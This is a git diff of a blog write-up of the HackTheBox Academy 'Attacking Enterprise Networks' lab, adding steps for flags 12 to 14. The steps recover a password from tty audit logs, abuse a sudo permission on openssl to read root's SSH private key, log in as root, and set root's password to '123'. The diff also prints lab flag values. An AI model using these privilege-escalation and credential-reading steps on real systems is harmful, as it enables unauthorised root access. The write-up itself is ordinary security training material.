@@ -4,9 +4,9 @@ date: 2025-03-14 00:00:01 +0800
 categories: [HTBAcademy]
 tags: [CPTS]
 ---
-Attacking Enterprise Networks is the final module for the HackTheBox Certified Penetration Tester Specialist career pathway. It attempts to combine all of the concepts that the student has learned from all of the previous modules and also best emulates the 10-day penetration test examination the student is expected to take after completing said modules. Other security professionals have said that the best way to take this module is to attempt it blind as a black-box penetration test, not reading any of the questions for hints and only working off of the given domain name and ip address to find all of the flags in the simulated Active Directory domain. 
+Attacking Enterprise Networks is the final module for the HackTheBox Certified Penetration Tester Specialist career pathway. It attempts to combine all of the concepts that the student has learned from all of the previous modules and best emulates the 10-day penetration test examination expected to be taken after completing said modules. Other security professionals state that an effective way to prepare for the examination is to attempt this module blind as a black-box penetration test, only working off of the given domain name and ip address to find all of the flags in the simulated Active Directory domain. 
 
-Credit to Yerald Leiva on YouTube for his voiceless walkthrough which helped me navigate this box. This is the first full-scale blackbox engagement that I attempted blind, but whenever I got stuck his videos helped me on further tuning my methodology. 
+Credit to Yerald Leiva on YouTube for his voiceless walkthrough which helped me navigate this box. This is the first full-scale blackbox engagement that I ever attempted, and whenever I got stuck his videos helped me on further tuning my methodology. 
 
 ## First Flag
 
@@ -127,7 +127,7 @@ The command gives us this table:
 +----+-----------------------------------+----------+
 ```
 
-and we get the ==6th flag: 1fbea4df249ac4f4881a5da387eb297cf==
+and we get the 6th flag: 1fbea4df249ac4f4881a5da387eb297cf
 
 ### Seventh Flag:
 For tracking.inlanefreight.local, we try to list out potential filesystems with a javascript command using XMLHttpRequest():
@@ -288,3 +288,41 @@ For the twelveth flag, unfortunately I had to refer to the Attacking Enterprise 
 ```
 aureport --tty | less
 ```
+From this command, we see "ILFreightnixadm!" as the password for the srvadm account. We then switch to the srvadm account and try to find the flag:
+```
+find / -type f -iname "*flag*" 2>/dev/null
+```
+and we see the directory /srv/ftp/flag.txt and get the 12th flag: HTB{0eb0ab788df18c3115ac43b1c06ae6c4}
+
+### Thirteenth Flag:
+
+There is probably a flag in /root but unfortunately I can't cd to /root as the srvadm. I check my sudo -l privileges and see the following:
+```
+User srvadm may run the following commands on dmz01:
+    (ALL) NOPASSWD: /usr/bin/openssl
+```
+Since we have sudo command on /usr/bin/openssl, we will check GTFOBINS for an exploit. There is a sudo exploit on GTFOBINS, but it did not work in getting me root access. I checked Yerald's video and see that he has two commands to get root:
+```
+LFILE=/root/.ssh/id_rsa
+sudo /usr/bin/openssl enc -in $LFILE
+```
+The first declares the LFILE variable as the ssh private key id_rsa under the root directory. 
+The second exploits the openssl sudo privilege to encrypt the ssh private key with "-in $LFILE" to use the file path specified by the environment variable $LFILE. 
+```
+sudo /usr/bin/opensll enc -in /root/.ssh/id_rsa
+```
+Not sure if it is necessary to call the LFILE variable, as the command above also works in retrieving the private key. Now we can use the SSH private key to authenticate as root:
+```
+ssh -i id_rsa root@(ip)
+```
+Now we can browse to the /root directory and concatenate the Thirteenth flag:
+```
+a34985b5976072c3c148abc751671302
+```
+### Fourteenth Flag:
+Just for convenience, I have set root's password to 123 with the passwd command. 
+
+
+
+
+
